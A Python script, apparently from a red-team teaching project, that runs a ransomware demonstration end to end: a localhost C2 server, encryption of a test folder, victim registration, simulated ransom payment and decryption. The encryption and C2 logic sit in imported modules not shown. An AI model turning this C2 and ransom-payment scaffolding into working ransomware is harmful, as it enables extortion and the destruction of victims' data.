"""
Automated Demo Script
Runs the complete ransomware demonstration
"""

import os
import time
import threading
import requests
from src.c2_gui_server import C2ServerWithGUI
from src.ransomware import demo_encrypt
from src.decryptor import RansomwareDecryptor

def start_c2_server():
    """Start the C2 server in a separate thread"""
    server = C2ServerWithGUI()
    server_thread = threading.Thread(target=server.run, daemon=True)
    server_thread.start()
    time.sleep(2)  # Give server time to start
    return server

def wait_for_victim():
    """Wait for a victim to register with C2"""
    print("\n[*] Waiting for victim registration...")
    max_wait = 30
    for i in range(max_wait):
        try:
            response = requests.get("http://localhost:5000/victims")
            if response.status_code == 200:
                victims = response.json().get('victims', [])
                if victims:
                    victim_id = victims[0]['victim_id']
                    print(f"[+] Victim found: {victim_id}")
                    return victim_id
        except:
            pass
        
        print(f"    {max_wait - i} seconds remaining...", end='\r')
        time.sleep(1)
    
    print("\n[-] No victim registered within timeout")
    return None

def simulate_payment(victim_id):
    """Simulate victim payment"""
    print(f"\n[*] Simulating payment for victim {victim_id}...")
    try:
        response = requests.get(f"http://localhost:5000/mark_paid/{victim_id}")
        if response.status_code == 200:
            print("[+] Payment simulated successfully!")
            return True
    except Exception as e:
        print(f"[-] Payment simulation failed: {e}")
    
    return False

def perform_decryption(victim_id):
    """Perform file decryption"""
    print(f"\n[*] Starting decryption process...")
    decryptor = RansomwareDecryptor("data/private_key.pem")
    success = decryptor.decrypt_filesystem(victim_id)
    return success

def main():
    print("=" * 70)
    print("🔴 RED TEAM RANSOMWARE DEMONSTRATION")
    print("⚠️  EDUCATIONAL USE ONLY - ISOLATED LAB ENVIRONMENT")
    print("=" * 70)
    
    # Verify we're in the right environment
    if not os.path.exists("data/public_key.pem"):
        print("[-] Encryption keys not found. Run setup.py first!")
        return
    
    print("\n🎯 Starting automated demo...")
    print("[*] This will demonstrate the complete ransomware lifecycle")
    print("[*] Demo will use ./test_files/ directory only")
    
    input("\nPress Enter to start the demo...")
    
    # Phase 1: Start C2 Server
    print("\n" + "=" * 50)
    print("PHASE 1: Starting Command & Control Server")
    print("=" * 50)
    start_c2_server()
    print("[+] C2 Server started on http://localhost:5000")
    
    # Phase 2: Execute Ransomware
    print("\n" + "=" * 50)
    print("PHASE 2: Executing Ransomware")
    print("=" * 50)
    if not demo_encrypt():
        print("[-] Ransomware execution failed!")
        return
    
    # Phase 3: Wait for Victim Registration
    print("\n" + "=" * 50)
    print("PHASE 3: Victim Registration")
    print("=" * 50)
    victim_id = wait_for_victim()
    if not victim_id:
        print("[-] Demo failed - no victim registered")
        return
    
    # Phase 4: Simulate Payment
    print("\n" + "=" * 50)
    print("PHASE 4: Payment Simulation")
    print("=" * 50)
    if not simulate_payment(victim_id):
        print("[-] Payment simulation failed!")
        return
    
    # Phase 5: File Recovery
    print("\n" + "=" * 50)
    print("PHASE 5: File Recovery")
    print("=" * 50)
    if perform_decryption(victim_id):
        print("\n✅ DEMO COMPLETED SUCCESSFULLY!")
        print("\n📊 Summary:")
        print("  • C2 Server: http://localhost:5000")
        print(f"  • Victim ID: {victim_id}")
        print("  • Files: Encrypted and successfully recovered")
        print("  • Payment: Simulated and verified")
    else:
        print("\n❌ Demo completed with errors")
    
    print("\n" + "=" * 70)
    print("🎓 Educational demonstration complete!")
    print("⚠️  Remember: This is for learning purposes only!")
    print("=" * 70)

if __name__ == "__main__":
    main()